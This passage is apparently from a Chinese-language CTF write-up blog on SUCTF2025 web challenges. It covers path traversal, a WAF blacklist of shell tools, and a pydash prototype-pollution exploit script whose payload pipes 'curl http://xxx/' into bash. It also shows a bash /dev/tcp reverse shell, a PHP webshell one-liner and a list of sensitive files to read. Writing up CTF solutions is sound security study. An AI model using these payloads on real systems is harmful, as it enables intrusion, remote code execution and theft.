logged out.&quot;</span>, <span class="string">&quot;info&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">10006</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>解决方法一：&#x2F;Admin SSTI | FALSE</p>
+<ol>
+<li><p>打&#x2F;Admin的ssti，绕过waf</p>
+</li>
+<li><p>emm，还有个pydash，没那么简单，还需要再想想</p>
+</li>
+<li><p>需要再读admin.html: &#x2F;article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;templates&#x2F;admin.html</p>
+<ol>
+<li>返回如下<ol>
+<li>user_data，emm是个对象啊bro，这么玩，无回显？大那是可以写入和读取吧</li>
+</ol>
+</li>
+</ol>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span>Processed Data:<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>&#123;&#123; user_data &#125;&#125;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>解决方法二：其他ssti | FALSE</p>
+<ol>
+<li><p>如果只是ssti的话，在&#x2F;article打不是更好？不用articles&#x2F;开头就render file_name了，读一下article.html</p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Article - &#123;&#123; file_name &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;&#123; content | safe &#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>不对不对，ssti不是这样</p>
+</li>
+</ol>
+</li>
+<li><p>解决方法三：python pp | True</p>
+<ol>
+<li><p>waf和pydash(原型链)，这里应该需要到rce，至少是列目录</p>
+</li>
+<li><p>说到列目录，似乎见过这种题，但是这里不适用emm</p>
+</li>
+<li><p>那就只能rce了，结合[<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/]%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%80%9D%E8%B7%AF">https://tttang.com/archive/1876/]，有两种思路</a></p>
+<ol>
+<li>直接打rce(是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的payload只会在模板在第一次访问时触发)</li>
+<li>修改render的识别符号，来进行ssti(也需要考虑缓存)</li>
+</ol>
+</li>
+<li><p>关于waf.py可以黑名单测试也可以读一下(居然是非预期): &#x2F;article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;waf..&#x2F;.py</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> key_blacklist = [</span><br><span class="line">    <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;router&#x27;</span>, <span class="string">&#x27;name_index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;directory_handler&#x27;</span>, <span class="string">&#x27;directory_view&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;_static_folder&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,  <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">value_blacklist = [</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;nl&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;tail&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;cut&#x27;</span>, <span class="string">&#x27;awk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;strings&#x27;</span>, <span class="string">&#x27;od&#x27;</span>, <span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;ch&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;sl&#x27;</span>, <span class="string">&#x27;find&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;mv&#x27;</span>, <span class="string">&#x27;ty&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;tac&#x27;</span>, <span class="string">&#x27;less&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;head&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;gcc&#x27;</span>, <span class="string">&#x27;uniq&#x27;</span>, <span class="string">&#x27;vi&#x27;</span>, <span class="string">&#x27;vim&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;xxd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;readflag&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将黑名单转换为字节串</span></span><br><span class="line">key_blacklist_bytes = [word.encode() <span class="keyword">for</span> word <span class="keyword">in</span> key_blacklist]</span><br><span class="line">value_blacklist_bytes = [word.encode() <span class="keyword">for</span> word <span class="keyword">in</span> value_blacklist]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_blacklist</span>(<span class="params">data, blacklist</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwaf</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># 将 key 转换为字节串</span></span><br><span class="line">    key_bytes = key.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_blacklist(key_bytes, key_blacklist_bytes):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key contains blacklisted words.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cwaf</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">77</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Value exceeds 77 characters.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将 value 转换为字节串</span></span><br><span class="line">    value_bytes = value.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_blacklist(value_bytes, value_blacklist_bytes):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Value contains blacklisted words.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h3 id="SU-blog-复现-SV"><a href="#SU-blog-复现-SV" class="headerlink" title="SU_blog 复现 | SV"></a>SU_blog 复现 | SV</h3><blockquote>
+<p>也算是分析出来了，就是操作上有一些麻烦，在这里试试</p>
+</blockquote>
+<ol>
+<li><p>直接上payload</p>
+<ol>
+<li><strong>一开始这一步忘记了</strong>: 运行完脚本后访问一个模板就可以执行命令了</li>
+<li>这里实际环境会隔两分钟刷新，要卡刷新后第一次访问模板，实战中应该是要在python中发然后随时看nc端口的</li>
+<li>SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}</li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### /Admin ssti</span></span><br><span class="line">path_admin=<span class="string">&quot;/Admin&quot;</span></span><br><span class="line">admin_params=&#123;</span><br><span class="line">    <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;SUers&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">admin_json=&#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;curl http://xxx/ | bash&#x27;);#&quot;</span>    <span class="comment"># 应该是有长度限制</span></span><br><span class="line">&#125;</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>,<span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIn0.Z4-3cw.2M6wNP8P2Wh6W2YtNylsZRzhMzw&quot;</span>)  <span class="comment"># 指定给定的session键值对</span></span><br><span class="line">r = session.post(url=host+path_admin, params=admin_params, json=admin_json, proxies=proxies,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index.html或者kc1zsa4.sh</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&quot;</span></span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:xxx kc1zs4.sh</span><br><span class="line">nc -lvvp xxx</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="SU-blog总结"><a href="#SU-blog总结" class="headerlink" title="SU_blog总结"></a>SU_blog总结</h3><blockquote>
+<p>[<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/]">https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/]</a></p>
+</blockquote>
+<ul>
+<li><input disabled="" type="checkbox"> 敏感文件泄露</li>
+<li><input disabled="" type="checkbox"> flask session机制</li>
+<li><input disabled="" type="checkbox"> 反弹shell</li>
+<li><input disabled="" type="checkbox"> 这里路径的拼接怎么办</li>
+</ul>
+<blockquote>
+<p>还是需要再敏感一点的，pydash首先考虑，ssti没理解到位</p>
+</blockquote>
+<ol>
+<li>&#x2F;etc&#x2F;passwd</li>
+<li>apache，nginx配置文件获取运行目录</li>
+<li>&#x2F;proc目录<ol>
+<li>&#x2F;proc&#x2F;1&#x2F;environ</li>
+<li>&#x2F;proc&#x2F;self&#x2F;cmdline</li>
+<li>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/122660083]">https://blog.csdn.net/cosmoslin/article/details/122660083]</a></li>
+</ol>
+</li>
+<li>日志文件</li>
+</ol>
+<h3 id="SU-photogallery总结"><a href="#SU-photogallery总结" class="headerlink" title="SU_photogallery总结"></a>SU_photogallery总结</h3><ul>
+<li><input checked="" disabled="" type="checkbox"> http上传文件</li>
+<li><input checked="" disabled="" type="checkbox"> python上传文件</li>
+<li><input disabled="" type="checkbox"> python生成文件</li>
+<li><input disabled="" type="checkbox"> zipslip</li>
+</ul>
+<ol>
+<li>一个思想是安全漏洞和版本与<strong>环境</strong>是紧密相关，还是要足够发散和细心</li>
+<li>复现不出来可以看看解释，找到的文章里就有，不要太急急急</li>
+<li>列idea是一个好习惯啊，安全与**错误返回和错误不返回(逻辑漏洞)**也是息息相关的</li>
+<li>绕黑名单的传入思想是不错的: <code>&lt;?php ($_GET[&#39;kc1zs4&#39;])($_POST[&#39;kc1zs4&#39;]);</code></li>
+<li>这一题还有一个意识，条件竞争再测试环境下不太行</li>
+</ol>
+<h3 id="SU-POP总结"><a href="#SU-POP总结" class="headerlink" title="SU_POP总结"></a>SU_POP总结</h3><ul>
+<li><input disabled="" type="checkbox"> <code>$this -&gt; $name</code>和<code>$this -&gt; name</code></li>
+<li><input disabled="" type="checkbox"> 这里Response.php中的stream怎么办</li>
+<li><input disabled="" type="checkbox"> 补充一点php命名空间的学习，顺便梳理清除一下php的session和file upload这些内容吧，还有变量类型是什么鬼</li>
+</ul>
+<ol>
+<li>这种类型题目复现先理解链子后再手动找，不然卡到啥的要复现很久</li>
+<li>官方的pop链也可以看看，有点意思，只有三环</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-POP"><span class="toc-number">1.</span> <span class="toc-text">SU_POP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">SU_POP 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E5%88%86%E6%9E%90-SV"><span class="toc-number">1.2.</span> <span class="toc-text">SU_POP 分析 | SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">1.3.</span> <span class="toc-text">SU_POP 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-photogallery"><span class="toc-number">2.</span> <span class="toc-text">SU_photogallery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">SU_photogallery 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E5%88%86%E6%9E%90-SV"><span class="toc-number">2.2.</span> <span class="toc-text">SU_photogallery 分析 | SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">2.3.</span> <span class="toc-text">SU_photogallery 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-blog"><span class="toc-number">3.</span> <span class="toc-text">SU_blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">SU_blog 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E5%88%86%E6%9E%90-SV"><span class="toc-number">3.2.</span> <span class="toc-text">SU_blog 分析| SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">3.3.</span> <span class="toc-text">SU_blog 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">SU_blog总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.</span> <span class="toc-text">SU_photogallery总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP%E6%80%BB%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">SU_POP总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/21/SUCTF2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&text=SUCTF2025"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&is_video=false&description=SUCTF2025"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF2025&body=Check out this article: https://kc1zs4.github.io/2025/01/21/SUCTF2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&name=SUCTF2025&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&t=SUCTF2025"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
